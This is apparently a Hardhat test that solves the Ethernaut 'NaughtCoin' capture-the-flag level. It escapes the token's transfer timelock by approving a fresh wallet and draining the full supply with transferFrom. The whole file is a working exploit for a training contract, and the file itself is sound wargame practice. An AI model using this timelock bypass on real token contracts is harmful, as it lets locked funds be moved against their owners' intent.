const { expect } = require("chai");
const { createChallenge, submitLevel } = require("./utils");

async function getChallenge() {
  const factory = await ethers.getContractFactory("NaughtCoin");
  const challengeAddress = await createChallenge(`0x80934BE6B8B872B364b470Ca30EaAd8AEAC4f63F`)
  const challenge = factory.attach(challengeAddress);
  return challenge;
}

it("Solves 15-NaughtCoin", async function () {
  const challenge = await getChallenge();

  const [eoa] = await ethers.getSigners();
  const address = await eoa.getAddress();

  const wallet = ethers.Wallet.createRandom(eoa.provider);
  const walletAddress = await wallet.getAddress();

  // Send some ether to wallet for gas fee.
  await eoa.sendTransaction({
    to: walletAddress,
    value: ethers.parseEther("0.01")
  });

  const amount = await challenge.INITIAL_SUPPLY();
  await challenge.approve(walletAddress, amount);
  await challenge.connect(wallet).transferFrom(address, walletAddress, amount);

  expect(await submitLevel(await challenge.getAddress())).to.equal(true);
});
